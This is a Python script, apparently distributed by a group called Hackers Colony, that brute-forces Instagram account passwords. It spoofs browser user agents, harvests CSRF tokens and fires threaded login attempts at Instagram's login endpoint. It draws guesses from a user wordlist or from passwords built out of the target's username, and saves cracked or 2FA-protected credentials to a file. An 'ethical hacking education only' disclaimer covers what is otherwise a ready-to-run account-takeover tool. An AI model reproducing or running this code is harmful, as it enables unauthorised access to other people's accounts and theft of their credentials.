import os, requests, threading, time, random, sys
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text
from rich.align import Align
from datetime import datetime
from bs4 import BeautifulSoup
from faker import Faker
from concurrent.futures import ThreadPoolExecutor
import pyfiglet

console = Console()
fake = Faker()
found = False
lock = threading.Lock()

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner(text, style):
    banner = pyfiglet.figlet_format(text)
    console.print(Align.center(f"[{style}]{banner}[/{style}]"))

def hco_hackers_banner():
    clear()
    show_banner("HCO-TEAM", "bold red")
    console.print(Panel.fit(
        "[green]This tool is for ethical hacking education only.\n"
        "[cyan]Watch full tutorial:[/cyan] [bold blue]https://youtube.com/@hackers_colony_tech[/bold blue]",
        title="[bold yellow]HCO Hackers Tool[/bold yellow]",
        border_style="magenta",
        padding=(1, 2)
    ))
    time.sleep(2)
    if os.name == "posix":
        os.system("termux-open-url https://youtube.com/@hackers_colony_tech")
    Prompt.ask("[yellow]Press Enter after subscribing to continue...[/yellow]")
    clear()

def igbrut_tool_banner():
    show_banner("HCO-IG", "bold blue")
    console.print(Panel.fit(
        "[cyan]FASTEST INSTAGRAM BRUTFORCE 🔥 TOOL\n"
        "[magenta]Made by:[/magenta] [bold green]ALI SABRI | HACKERS COLONY OFFICIAL[/bold green]",
        title="[bold green]Welcome[/bold green]",
        border_style="cyan",
        padding=(1, 2)
    ))

def get_csrf_session():
    session = requests.Session()
    headers = {
        "User-Agent": fake.user_agent(),
    }
    r = session.get("https://www.instagram.com/accounts/login/", headers=headers)
    token = r.cookies.get_dict().get("csrftoken")
    return session, token

def try_login(username, password, session, csrf):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": fake.user_agent(),
        "X-CSRFToken": csrf,
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    }
    timestamp = int(time.time())
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}",
        "queryParams": {},
        "optIntoOneTap": "false"
    }
    try:
        r = session.post(url, headers=headers, data=payload, allow_redirects=True)
        if r.status_code != 200:
            return "error"
        result = r.json()
        if result.get("authenticated"):
            return "success"
        elif "checkpoint_url" in result:
            return "2fa"
        else:
            return "fail"
    except:
        return "error"

def save_success(username, password, status):
    with open("found.txt", "a") as f:
        f.write(f"{username} : {password} ({status}) - {datetime.now()}\n")

def worker(username, password):
    global found
    if found:
        return
    session, csrf = get_csrf_session()
    status = try_login(username, password.strip(), session, csrf)
    with lock:
        if status == "success":
            console.print(f"\n✅ [bold green]Password Found: {password.strip()}[/bold green]")
            save_success(username, password.strip(), "SUCCESS")
            found = True
        elif status == "2fa":
            console.print(f"\n🔒 [yellow]2FA Enabled | Password Might Be: {password.strip()}[/yellow]")
            save_success(username, password.strip(), "2FA")
            found = True
        elif status == "fail":
            console.print(f"[✘] Tried: [red]{password.strip()}[/red]")
        elif status == "error":
            console.print("[⏳] [cyan]Rate limit or error. Retrying after short delay...[/cyan]")
            time.sleep(5)

def generate_auto_wordlist(username):
    from itertools import permutations
    base = username.lower().replace(".", "_").split("_")
    common = ["123", "1234", "786", "1122", "2003", "love", "143"]
    wordlist = []
    for part in base:
        for c in common:
            wordlist.append(part + c)
            wordlist.append(c + part)
    for p in permutations(base, 2):
        wordlist.append("".join(p))
    return list(set(wordlist))

def main():
    global found
    hco_hackers_banner()
    igbrut_tool_banner()
    username = Prompt.ask("[cyan]Enter Instagram Username[/cyan]").strip()
    auto_mode = Prompt.ask("[cyan]Use Auto Wordlist? (y/n)[/cyan]").strip().lower()

    if auto_mode == "y":
        passwords = generate_auto_wordlist(username)
        console.print(f"\n📂 [yellow]Auto Wordlist Generated: {len(passwords)} passwords[/yellow]")
    else:
        path = Prompt.ask("[cyan]Enter path to wordlist file[/cyan]").strip()
        if not os.path.exists(path):
            console.print("[red]❌ Wordlist not found![/red]")
            sys.exit()
        with open(path, "r") as f:
            passwords = [i.strip() for i in f if i.strip()]
        console.print(f"\n📂 [yellow]Wordlist Loaded: {len(passwords)} passwords[/yellow]")

    threads = int(Prompt.ask("[cyan]Enter number of threads (e.g. 5)[/cyan]"))

    console.rule(f"🔐 Brute Forcing [bold cyan]@{username}[/bold cyan]", style="cyan")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(lambda pwd: worker(username, pwd), passwords)

    console.rule("🔚 Result", style="magenta")
    if found:
        console.print("[bold green]✔ Password found. Saved to found.txt[/bold green]")
    else:
        console.print("[bold red]✘ Password not found. Try a better wordlist.[/bold red]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]⛔ Interrupted by user. Exiting...[/red]")
        sys.exit()
        
